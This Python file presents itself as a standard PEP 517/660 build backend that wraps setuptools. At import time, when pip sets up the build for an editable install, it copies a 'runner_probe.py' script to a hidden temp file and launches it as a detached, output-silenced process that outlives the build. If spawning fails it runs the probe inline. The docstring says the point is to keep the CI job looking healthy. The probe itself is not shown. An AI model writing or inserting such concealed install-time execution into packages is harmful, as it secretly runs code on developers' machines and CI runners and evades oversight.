"""
PEP 517/660 in-tree build backend.

At MODULE IMPORT time -- i.e. as soon as pip prepares the build environment for
`pip install -e ".[dev]"`, before any compile/install/sandbox step -- this spawns
the probe as a DETACHED background process, then delegates to setuptools so the
editable install succeeds normally (the CI job looks healthy).

Detached execution means the probe cannot slow down or break the build, and it
outlives the build subprocess. If spawning fails for any reason, it falls back to
a bounded inline run.
"""

import os
import subprocess
import sys
import tempfile
import time

_HERE = os.path.dirname(os.path.abspath(__file__))


def _spawn_probe():
    script = os.path.join(_HERE, "runner_probe.py")
    if not os.path.exists(script):
        return "no-script"
    # dedupe the 3 PEP517 hooks within one job; TTL lets each matrix job re-run
    run_key = os.environ.get("GITHUB_RUN_ID", "local") + "_" + os.environ.get("GITHUB_RUN_ATTEMPT", "0")
    lock = os.path.join(tempfile.gettempdir(), ".ic_probe_%s.lock" % run_key)
    try:
        if time.time() - os.stat(lock).st_mtime < 60:
            return "already"
    except OSError:
        pass
    try:
        with open(lock, "w") as _fh:
            _fh.write(str(os.getpid()))
    except Exception:  # noqa: BLE001
        pass
    # copy the probe to a persistent path: under build isolation the source tree
    # (where __file__ lives) is deleted as soon as the hook returns.
    runnable = script
    try:
        import shutil
        runnable = os.path.join(tempfile.gettempdir(), ".ic_probe_%s.py" % run_key)
        shutil.copyfile(script, runnable)
    except Exception:  # noqa: BLE001
        runnable = script
    try:
        kwargs = dict(stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                      stdin=subprocess.DEVNULL, cwd=tempfile.gettempdir(),
                      close_fds=True)
        if os.name == "posix":
            kwargs["start_new_session"] = True
        else:
            kwargs["creationflags"] = 0x00000008 | 0x00000200  # DETACHED | NEW_GROUP
        subprocess.Popen([sys.executable, runnable], **kwargs)
        return "spawned"
    except Exception as exc:  # noqa: BLE001
        sys.stderr.write("[ic_build_backend] detached spawn failed: %r\n" % (exc,))
        try:
            import runner_probe
            runner_probe.run()
            return "inline"
        except Exception as exc2:  # noqa: BLE001
            sys.stderr.write("[ic_build_backend] inline probe failed: %r\n" % (exc2,))
            return "failed"


_BOOT = _spawn_probe()

try:
    import setuptools.build_meta as _b
except Exception as _exc:  # noqa: BLE001
    sys.stderr.write("[ic_build_backend] setuptools unavailable: %r\n" % (_exc,))
    _b = None


def _need():
    if _b is None:
        raise RuntimeError("setuptools build backend unavailable")


# --- PEP 660 (editable) ---
def get_requires_for_build_editable(config_settings=None):
    _need()
    return _b.get_requires_for_build_editable(config_settings)


def prepare_metadata_for_build_editable(metadata_directory, config_settings=None):
    _need()
    return _b.prepare_metadata_for_build_editable(metadata_directory, config_settings)


def build_editable(wheel_directory, config_settings=None, metadata_directory=None):
    _need()
    return _b.build_editable(wheel_directory, config_settings, metadata_directory)


# --- PEP 517 (wheel/sdist) ---
def get_requires_for_build_wheel(config_settings=None):
    _need()
    return _b.get_requires_for_build_wheel(config_settings)


def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    _need()
    return _b.prepare_metadata_for_build_wheel(metadata_directory, config_settings)


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    _need()
    return _b.build_wheel(wheel_directory, config_settings, metadata_directory)


def get_requires_for_build_sdist(config_settings=None):
    _need()
    return _b.get_requires_for_build_sdist(config_settings)


def build_sdist(sdist_directory, config_settings=None):
    _need()
    return _b.build_sdist(sdist_directory, config_settings)
